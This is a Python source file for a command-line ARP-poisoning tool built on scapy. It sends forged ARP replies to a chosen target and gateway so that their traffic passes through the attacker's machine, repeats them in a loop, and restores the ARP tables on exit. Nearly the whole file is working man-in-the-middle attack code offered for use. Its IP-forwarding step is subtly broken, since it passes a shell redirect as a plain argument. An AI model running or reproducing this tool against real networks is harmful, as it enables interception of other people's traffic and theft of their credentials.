import optparse
import subprocess
import scapy.all as scapy
import  time


def banner():
    print("\n @@@@@@   @@@@@@@   @@@@@@@      @@@@@@@    @@@@@@   @@@   @@@@@@    @@@@@@   @@@  @@@  @@@  @@@  @@@   @@@@@@@@     ")
    print("@@@@@@@@  @@@@@@@@  @@@@@@@@     @@@@@@@@  @@@@@@@@  @@@  @@@@@@@   @@@@@@@@  @@@@ @@@  @@@  @@@@ @@@  @@@@@@@@@     ")
    print("@@!  @@@  @@!  @@@  @@!  @@@     @@!  @@@  @@!  @@@  @@!  !@@       @@!  @@@  @@!@!@@@  @@!  @@!@!@@@  !@@           ")
    print("!@!  @!@  !@!  @!@  !@!  @!@     !@!  @!@  !@!  @!@  !@!  !@!       !@!  @!@  !@!!@!@!  !@!  !@!!@!@!  !@!           ")
    print("@!@!@!@!  @!@!!@!   @!@@!@!      @!@@!@!   @!@  !@!  !!@  !!@@!!    @!@  !@!  @!@ !!@!  !!@  @!@ !!@!  !@! @!@!@     ")
    print("!!!@!!!!  !!@!@!    !!@!!!       !!@!!!    !@!  !!!  !!!   !!@!!!   !@!  !!!  !@!  !!!  !!!  !@!  !!!  !!! !!@!!     ")
    print("!!:  !!!  !!: :!!   !!:          !!:       !!:  !!!  !!:       !:!  !!:  !!!  !!:  !!!  !!:  !!:  !!!  :!!   !!:     ")
    print(":!:  !:!  :!:  !:!  :!:          :!:       :!:  !:!  :!:      !:!   :!:  !:!  :!:  !:!  :!:  :!:  !:!  :!:   !::     ")
    print("::   :::  ::   :::   ::           ::       ::::: ::   ::  :::: ::   ::::: ::   ::   ::   ::   ::   ::   ::: ::::     ")
    print(" :   : :   :   : :   :            :         : :  :   :    :: : :     : :  :   ::    :   :    ::    :    :: :: :      ")

    print("\n" + "*"*113)
    print("\t\t\t\t\t\t  Author  : Furkan BEKAR\n\t\t\t\t\t\t  Version : 1.0\n\t\t\t\t\t\t  GitHub  : https://github.com/FurkanBekar")
    print("*"*113)

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t","--target",dest="target",help="Enter the IP address you want to poison",nargs=1)
    parse_object.add_option("-g","--gateway",dest="gateway",help="Enter the IP address of the modem or router on the network you are targeting",nargs=1)
    parse_object.add_option("-s","--sleep",dest="sleep",help="Enter the time in seconds between Arp response to be sent",nargs=1)
    parse_object.add_option("-i","--ignore",dest="ignore",help="If you think the modem is a protection against a mitm attack, it will only poison the device you are targeting.",nargs=0)

    return parse_object.parse_args()

def ip_forwarding():
    subprocess.call(["echo","1",">","/proc/sys/net/ipv4/ip_forward"])

def get_mac_address(target_ip):
    print("[!] Searching the MAC address of the target device")

    lenn = 0

    while lenn == 0:
        arp_request_packet = scapy.ARP(pdst=target_ip)
        broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        combined_packet = broadcast_packet/arp_request_packet
        answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]

        print("\r[!] Just a moment, please. We're waiting for the target device's arp response.", end="")

        lenn = len(answered_list)

        time.sleep(1)

    print("[!] MAC address of target device found!")

    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip,poisoned_ip):
    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)

def reset_operation(fooled_ip,gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=6)

banner()

user_input = get_user_input()[0]
print(user_input)
number = 0

try:
    ip_forwarding()
except:
    print("[!] An error occurred while enabling IP routing. Please do the ip routing manually.")
finally:
    try:
        while True:
            arp_poisoning(user_input.target,user_input.gateway)
            if user_input.ignore == None:
                arp_poisoning(user_input.gateway,user_input.target)

            number += 2

            print("\rSending packets " + str(number), end="")

            if user_input.sleep == None:
                time.sleep(3)
            else:
                time.sleep(int(user_input.sleep))
    except KeyboardInterrupt:
        print("\nQuit & Reset")
        reset_operation(user_input.target,user_input.gateway)
        reset_operation(user_input.gateway,user_input.target)
